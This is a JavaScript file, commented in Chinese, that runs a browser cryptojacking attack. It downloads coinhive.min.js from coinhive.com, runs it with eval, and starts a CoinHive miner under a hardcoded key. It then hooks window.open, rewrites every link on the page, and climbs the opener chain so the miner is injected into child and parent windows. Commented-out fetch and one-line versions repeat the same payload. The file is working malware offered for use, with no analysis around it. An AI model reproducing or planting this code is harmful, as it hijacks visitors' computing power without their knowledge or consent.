window.dig = {}
	window.dig.doo = function(c){
		c.dig.x = new c.XMLHttpRequest();								//2、插入挖矿脚本
		c.dig.x.onreadystatechange = function(){
			if(c.dig.x.readyState == 4 && c.dig.x.status == 200){
				c.eval(c.dig.x.responseText);
				c.dig.CoinHive = c.CoinHive;
				c.dig.m = new c.dig.CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4", {throttle: 0.8});
				c.dig.m.start();
				c.console.log('ok');
			}
		}

		c.dig.x.open("GET","https://coinhive.com/lib/coinhive.min.js");
		c.dig.x.send();
	}

	window.dig.hAtag = function(c){

		c.dig.list = c.document.getElementsByTagName('a');				//4、hook所有A标签，控制打开的页面
		for(var i=0;i<c.dig.list.length;i++){
			if(c.dig.list[i].href.match(/^[http|https](.*)/)){
				var h = c.dig.list[i].href;
				c.dig.list[i].href = 'javascript:void(0)';
				c.dig.list[i].onclick = function(){c.open(h);}
			}
		}
	}

	window.dig.hOpen = function(c){
		c._open = c.open;									//1、hook window.open
		c.open = function(){
			c.t = c._open.apply(this,arguments);			//拿到子页面句柄
							
														//在父页面设置定时任务，等子页面加载完毕，在子页面执行操作
			c.t.onload = function(){

				c.t.dig = {}
				c.t.dig.doo = c.dig.doo;
				c.t.dig.hOpen = c.dig.hOpen;
				c.t.dig.hAtag = c.dig.hAtag;				

				c.t.dig.doo(c.t);
				c.t.dig.hOpen(c.t);
				c.t.dig.hAtag(c.t);
			}
			
			

			return c.t;
		}
	}
	

	window.dig.doo(window);
	window.dig.hOpen(window);
	window.dig.hAtag(window)
	// var fetch = window.fetch||fetch;						fetch版本
	// fetch("https://coinhive.com/lib/coinhive.min.js").then(function(r){return r.text()}).then(function(d){
	// 	eval(d);
	// 	var m = new CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4", {throttle: 0.5});
	// 	m.start();
	// });


//var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState==4&&x.status==200){eval(x.responseText);var m=new CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4",{throttle:0.5});m.start();console.log("ok")}};x.open("GET","https://coinhive.com/lib/coinhive.min.js");x.send();
		//------------------									//3、往opener注入脚本,父页面不可能增加，因此注入一次即可
		var t2 = window;						//往opener回溯，注入代码
		while(t2.opener!=null){
			t2 = t2.opener;
			try{
				if(t2.dig == null){
					t2.dig = {};
					t2.dig.doo = window.dig.doo;
					t2.dig.hOpen = window.dig.hOpen;
					t2.dig.hAtag = window.dig.hAtag;

					t2.dig.doo(t2);	
					t2.dig.hOpen(t2);
					t2.dig.hAtag(t2);
				}
			}
			catch(e){
				continue;
			}
		}
		//-----------------